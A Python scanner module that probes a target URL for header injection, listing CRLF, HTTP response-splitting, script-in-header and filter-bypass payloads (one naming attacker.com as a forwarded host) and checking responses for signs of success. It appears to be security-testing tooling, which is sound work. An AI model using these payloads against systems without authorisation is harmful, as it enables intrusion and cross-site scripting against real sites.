# Header Injection.Py Module

import requests
from . import get_session

# Advanced header injection payloads
HEADER_INJECTION_PAYLOADS = [
    # Basic header injections with newlines
    {"header": "User-Agent", "value": "Mozilla/5.0\r\nX-Injected-Header: injection-test"},
    {"header": "Referer", "value": "https://example.com\r\nX-Injected-Header: injection-test"},
    
    # CRLF header injections with response body
    {"header": "User-Agent", "value": "Mozilla/5.0\r\n\r\n<script>alert('HEADER_INJECTION_TEST')</script>"},
    {"header": "Referer", "value": "https://example.com\r\n\r\n<script>alert('HEADER_INJECTION_TEST')</script>"},
    
    # HTTP response splitting
    {"header": "User-Agent", "value": "Mozilla/5.0\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>Injected Page</html>"},
    
    # Header value manipulations
    {"header": "X-Forwarded-For", "value": "127.0.0.1, 192.168.0.1"},
    {"header": "X-Forwarded-Host", "value": "attacker.com"},
    {"header": "X-Forwarded-Proto", "value": "http"},
    
    # Content-Type manipulation
    {"header": "Content-Type", "value": "application/x-www-form-urlencoded\r\nX-Injected: test"},
    
    # URL encoded variants to bypass filters
    {"header": "User-Agent", "value": "Mozilla/5.0%0d%0aX-Injected-Header:%20test"},
    {"header": "Referer", "value": "https://example.com%0d%0aX-Injected-Header:%20test"},
    
    # Unicode/charset bypasses
    {"header": "User-Agent", "value": "Mozilla/5.0\u000d\u000aX-Injected-Header: test"},
    
    # Exotic variations for bypassing WAFs
    {"header": "User-Agent", "value": "Mozilla/5.0\n\rX-Injected-Header: test"},
    {"header": "User-Agent", "value": "Mozilla/5.0\r\tX-Injected-Header: test"},
    {"header": "User-Agent", "value": "Mozilla/5.0\rX-Injected-Header: test\n"}
]

def check(target_url, session=None):
    req_session = get_session(session)
    findings = []
    
    # Get baseline response
    try:
        r_baseline = req_session.get(target_url, timeout=5)
        baseline_headers = list(r_baseline.headers.keys())
        baseline_content_type = r_baseline.headers.get('Content-Type', '')
    except Exception:
        return findings
        
    # Test each payload
    for payload in HEADER_INJECTION_PAYLOADS:
        try:
            r = req_session.get(target_url, headers={payload["header"]: payload["value"]}, timeout=5)
            
            # Check for signs of successful injection
            
            # 1. Look for our injected headers in the response
            if "X-Injected-Header" in r.headers or "X-Injected" in r.headers:
                findings.append(f"Header injection successful: '{payload['header']}:{payload['value']}' - Injected header found in response")
                
            # 2. Look for script tags in the response that weren't in the baseline
            if "<script>alert('HEADER_INJECTION_TEST')</script>" in r.text and \
               "<script>alert('HEADER_INJECTION_TEST')</script>" not in r_baseline.text:
                findings.append(f"Header injection with XSS successful: '{payload['header']}:{payload['value']}'")
                
            # 3. Look for unusual response format/content type changes
            if r.headers.get('Content-Type', '') != baseline_content_type:
                findings.append(f"Content-Type changed via header injection: '{payload['header']}:{payload['value']}'")
                
            # 4. Check for new/different headers compared to baseline
            current_headers = list(r.headers.keys())
            new_headers = [h for h in current_headers if h not in baseline_headers]
            if new_headers:
                findings.append(f"New response headers after injection: {', '.join(new_headers)} using '{payload['header']}'")
                
            # 5. Check if 'Injected Page' appears in the response (HTTP Response Splitting)
            if "Injected Page" in r.text and "Injected Page" not in r_baseline.text:
                findings.append(f"HTTP Response Splitting successful: '{payload['header']}:{payload['value']}'")
                
        except Exception:
            continue
            
    return findings
